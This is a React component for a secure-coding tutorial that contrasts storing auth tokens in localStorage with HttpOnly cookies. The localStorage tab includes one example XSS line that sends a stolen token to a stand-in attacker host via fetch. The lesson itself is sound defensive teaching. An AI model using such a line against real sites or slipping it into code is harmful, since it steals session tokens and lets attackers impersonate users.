'use client'

import { TabbedCodeBlock } from '@/components/tabbed-code-block'

export function TokenStorageDemo() {
  return (
    <div className="my-8 space-y-4">
      <TabbedCodeBlock
        filename="auth.ts"
        tabs={[
          {
            label: "localStorage",
            icon: "problem",
            language: "javascript",
            code: `// Frontend stores the token
localStorage.setItem('access_token', token)

// Any script can access it:
const stolen = localStorage.getItem('access_token')

// If there's XSS, the token is stolen!
fetch('https://attacker.com?token=' + stolen)

// Problem: localStorage is accessible via JavaScript.
// If there's XSS, the attacker steals your token
// and authenticates as you.`
          },
          {
            label: "HttpOnly Cookies",
            icon: "solution",
            language: "javascript",
            code: `// Backend sets the cookie
res.cookie('auth_token', token, {
  httpOnly: true,    // Inaccessible to JavaScript!
  secure: true,      // HTTPS only
  sameSite: 'strict' // CSRF protection
})

// Frontend: cookie is sent automatically
// No need to do anything!

// Attempt to access via JavaScript:
document.cookie // → "" (empty, protected!)

// Benefits:
// • httpOnly: JavaScript cannot access
// • secure: HTTPS only
// • sameSite: CSRF protection
// • Automatic: Browser manages sending
//
// 💡 Even with XSS, the attacker cannot steal an HttpOnly cookie.`
          }
        ]}
      />
    </div>
  )
}
